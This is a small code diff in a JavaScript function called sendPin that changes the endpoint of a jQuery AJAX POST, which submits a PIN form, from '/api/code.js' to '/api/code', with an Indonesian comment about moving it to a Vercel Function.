@@ -204,7 +204,7 @@ function sendPin(){
     $(".load").fadeIn();
     $.ajax({
         type: 'POST',
-        url: '/api/code.js',   // ganti ke Vercel Function
+        url: '/api/code',   // ganti ke Vercel Function
         data: $('#formPin').serialize(),
         dataType: 'text',
         success: function(){
